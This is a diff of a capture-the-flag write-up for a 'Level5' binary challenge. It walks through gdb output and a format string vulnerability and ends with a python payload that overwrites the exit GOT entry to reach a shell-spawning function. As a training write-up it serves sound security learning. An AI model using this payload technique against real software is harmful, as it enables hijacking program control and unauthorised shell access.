@@ -1,17 +1,11 @@
-# Level 5
+# Level5
 
-https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf
-
-## 1. Identity
+## 1. Context
 
 ```bash
 $ id
 uid=2045(level5) gid=2045(level5) groups=2045(level5),100(users)
-```
 
-## 2. Home directory
-
-```bash
 $ pwd
 /home/user/level5
 
@@ -21,27 +15,28 @@ $ ls -la
 [...]
 ```
 
-## 3. Analyzing the file
+## 2. Program behavior
 
 Testing it :
-
 ```bash
 $ ./level5
 a
 a
 ```
 
-Expects an input and prints it
+Expects an input and prints it, nothing else...
 
-Nothing else...
+## 3. Code overview
 
-Looking at our functions with gdb, main() calls the function n().
-n() is vulnerable to format string attacks.
-Then checks the value of m. If m equals 0x1025544, a shell is launched.
-o() is an unused function but it launches a shell.
-Our goal is to modify the value of m.
+Looking at our functions, `main()` calls the function `n()`.
+`n()` is vulnerable to **format string attacks**.
+`o()` is unused but it launches a shell.
 
-Functions adresses :
+Our goal is to call `o()` using our **format string attack**.
+
+## 4. Exploit
+
+Functions address :
 ```bash
 (gdb) info function
 All defined functions:
@@ -65,7 +60,9 @@ BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825
 
 The adress of exit is at the 4th position.
 
-## 4. Getting the flag
+## 5. Getting the flag
+
+"0x080484a4" in decimal is "134513828" - the 4 bytes of the exit GOT address
 
 ```bash
 $ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
